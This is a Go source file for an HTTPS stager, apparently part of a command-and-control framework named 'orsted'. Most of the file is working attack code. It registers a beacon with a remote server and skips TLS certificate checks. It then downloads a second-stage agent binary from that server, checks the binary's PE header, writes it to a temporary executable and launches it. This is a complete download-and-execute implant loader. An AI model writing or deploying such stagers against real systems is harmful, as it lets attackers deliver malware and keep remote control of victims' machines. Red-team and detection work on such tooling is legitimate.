//go:build stager_https
// +build stager_https

package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"

	"orsted/beacon/core"
	"orsted/beacon/peers"
	"orsted/beacon/utils"
	"orsted/profiles"
)

var (
	TargetIP          string
	TargetPort        string
	HTTPProxyType     string = "none"
	HTTPProxyURL      string = ""
	HTTPProxyUsername string = ""
	HTTPProxyPassword string = ""
)

func isPEValid(data []byte) bool {
	if len(data) < 2 {
		return false
	}
	return data[0] == 0x4D && data[1] == 0x5A
}

func downloadAgent(url string) ([]byte, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	var buf bytes.Buffer
	_, err = io.Copy(&buf, resp.Body)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func executeAgent(data []byte) error {
	tmpFile, err := os.CreateTemp("", "agent_*.exe")
	if err != nil {
		return err
	}

	_, err = tmpFile.Write(data)
	if err != nil {
		tmpFile.Close()
		return err
	}
	tmpFile.Close()

	err = os.Chmod(tmpFile.Name(), 0755)
	if err != nil {
		return err
	}

	_, err = os.StartProcess(tmpFile.Name(), []string{tmpFile.Name()}, &os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	})

	return err
}

func stagerHTTPS() {
	_ = profiles.InitialiseProfile()

	profiles.Config.Domain = TargetIP
	profiles.Config.Port = TargetPort
	if HTTPProxyType == "http" || HTTPProxyType == "https" {
		profiles.Config.HTTPProxyType = HTTPProxyType
		profiles.Config.HTTPProxyUrl = HTTPProxyURL
		profiles.Config.HTTPProxyUsername = HTTPProxyUsername
		profiles.Config.HTTPProxyPassword = HTTPProxyPassword
	}

	hp, err := peers.NewHTTPSPeer(profiles.Config)
	if err != nil {
		fmt.Println("[stager] Error creating HTTPS peer:", err.Error())
		return
	}
	utils.ParentPeer = hp
	fmt.Println("[stager] Starting HTTPS Stager")

	beaconID, err := core.RegisterBeacon(hp)
	for err != nil {
		fmt.Println("[stager] Error while registering:", err.Error())
		time.Sleep(2 * time.Second)
		beaconID, err = core.RegisterBeacon(hp)
	}

	fmt.Println("[stager] Registered with ID:", beaconID)
	utils.CurrentBeaconId = beaconID

	downloadURL := fmt.Sprintf("https://%s:%s/agent/download/%s", TargetIP, TargetPort, beaconID)
	fmt.Println("[stager] Downloading agent from:", downloadURL)

	var agentBinary []byte
	for attempt := 1; attempt <= 3; attempt++ {
		agentBinary, err = downloadAgent(downloadURL)
		if err == nil && len(agentBinary) > 0 {
			break
		}
		if attempt < 3 {
			wait := time.Duration(1<<uint(attempt-1)) * 2 * time.Second
			fmt.Printf("[stager] Download failed (attempt %d), retrying in %.0fs: %v\n", attempt, wait.Seconds(), err)
			time.Sleep(wait)
		}
	}

	if len(agentBinary) == 0 {
		fmt.Println("[stager] Failed to download agent after retries")
		return
	}

	fmt.Printf("[stager] Agent downloaded, size: %d bytes\n", len(agentBinary))

	if !isPEValid(agentBinary) {
		fmt.Println("[stager] Downloaded agent is not a valid PE binary")
		return
	}

	fmt.Println("[stager] PE validation passed, executing agent")

	err = executeAgent(agentBinary)
	if err != nil {
		fmt.Println("[stager] Failed to execute agent:", err.Error())
		return
	}

	fmt.Println("[stager] Agent launched, stager exiting")
}

func main() {
	stagerHTTPS()
}
